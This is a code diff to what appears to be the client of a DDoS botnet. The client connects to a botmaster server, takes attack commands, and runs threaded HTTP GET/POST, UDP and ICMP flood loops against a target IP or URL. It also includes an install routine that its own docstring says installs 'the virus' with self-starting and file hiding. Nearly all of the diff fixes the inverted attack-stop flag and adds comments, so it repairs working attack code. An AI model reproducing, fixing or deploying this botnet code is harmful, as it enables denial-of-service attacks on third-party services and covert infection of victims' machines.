@@ -9,28 +9,31 @@ Self_starting = True
 # -*- coding:utf-8 -*-
 # @FileName  :client_source.py
 # @Author    :D0WE1L1N
+
 from socket import *
 from threading import Thread
 from random import _urandom, randint
 from os.path import abspath
 from sys import argv
+
 s = socket(AF_INET, SOCK_STREAM) # create socket
-ddos_flag = False # used to control ddos attack thread
+ddos_flag = True # used to control ddos attack thread, False when the attack is stopped
 path = abspath(argv[0]) # used in .exe mode
 
 def ddos(mode:str, address:str): #address : ip or url
     '''
-    This method is the main attack method
-    mode is ta supported attack method 
-    THE ADDRESS CAN BE A IP OR A URL
-    each method will define a method "attack", which will be execute countless times by thread and infinite loop
-    the "attack" method require a ip or url
+    This method is the main attack method.
+    mode is ta supported attack method .
+    THE ADDRESS CAN BE A IP OR A URL.
+    each method will define a method "attack", which will be execute countless times by thread and infinite loop.
+    the "attack" method require a ip or url.
     '''
     global ddos_flag
     print("[*]Start attack")
     if mode == 'httpGETflood' or mode == 'httpflood' or mode == 'httpPOSTflood': # httpflood method : only http GET flood
         from urllib import request,parse
         from ssl import _create_unverified_context
+        # headers can be set here
         dict = {
             "name":"ArcticWolf"
         } # can be changed
@@ -38,12 +41,12 @@ def ddos(mode:str, address:str): #address : ip or url
         data = bytes(parse.urlencode(dict), encoding='utf8')
         def attack(url):
             while True:
-                if ddos_flag: return
+                if not ddos_flag: return # To stop the attack
                 try:
                     if mode == 'httpGETflood' or 'httpflood': # GETflood for default
-                        with request.urlopen(url, context=context)as response:
+                        with request.urlopen(url, context=context)as response: # add headers=headers if headers is required
                             print('[*]code:', response.status)
-                    elif mode == 'httpPOSTflood':
+                    elif mode == 'httpPOSTflood': # POSTflood for default
                         with request.urlopen(url, data=data, context=context) as response:
                             print('[*]code:', response.status)
                 except Exception as e:
@@ -56,7 +59,7 @@ def ddos(mode:str, address:str): #address : ip or url
             port = 1
             sent = 0
             while True:
-                if ddos_flag: return
+                if not ddos_flag: return # To stop the attack
                 sock.sendto(byte, (ip, port))
                 sent = sent + 1
                 print(f"[*] Sent " + str(sent) + " packet to " + ip + " through port " + str(port))
@@ -85,14 +88,22 @@ def ddos(mode:str, address:str): #address : ip or url
         Sock = socket(AF_INET, SOCK_RAW, getprotobyname("icmp"))
         def attack(ip):
             while True:
-                if ddos_flag: return
+                if not ddos_flag: return # To stop the attack
                 Sock.sendto(icmp_data , (ip, 0))
                 sleep(0.5)
                 # recv_packet, addr = Sock.recvfrom(1024)
+                # send the packages
                 print('[*] packet sent')
     print('[*]Attack:', address)
     for i in range(Threads): Thread(target=attack, args=(address,)).start()
 def connect():
+    '''
+    This method is used to connect the botmaster host.
+    It will send a message to check if it was the botmaster.
+    When an error occured, this method will reset until the connection was on.
+    After getting the connection, this method will wait for the attack command.
+    Heartbeat message will also be recived and sent by this method.
+    '''
     global s
     try:
         try:
@@ -108,12 +119,12 @@ def connect():
             recvdata = s.recv(buffsize).decode('utf-8')
             print('[*]'+recvdata)
             if recvdata == 'stop_ddos':
-                ddos_flag = True
-            if recvdata.split('_')[0] == 'attack':
                 ddos_flag = False
+            if recvdata.split('_')[0] == 'attack':
+                ddos_flag = True
                 Thread(target=ddos, args=(recvdata.split('_')[1], recvdata.split("_")[2],)).start()
             if recvdata == 'heartbeat':
-                s.send("heartbeat".encode("utf8"))
+                s.send("heartbeat".encode("utf8")) # heartbeat system
             if recvdata == 'shut':
                 print('[*]shutdown the connection')
                 s.close()
@@ -123,7 +134,11 @@ def connect():
         s.close()
         s = socket(AF_INET, SOCK_STREAM)
         connect()
-def hide():
+def install():
+    '''
+    This method is used to install the virus to the host
+    inclued Self-starting, hiding and something else
+    '''
     global path
     if Attribute_hide:
         import win32api, win32con
@@ -145,7 +160,7 @@ if __name__ == '__main__':
     print("[*]start")
     # threading.Thread(target=connect).start()
     try:
-        hide()
+        install()
         connect()
     except Exception as e:
         print(e)
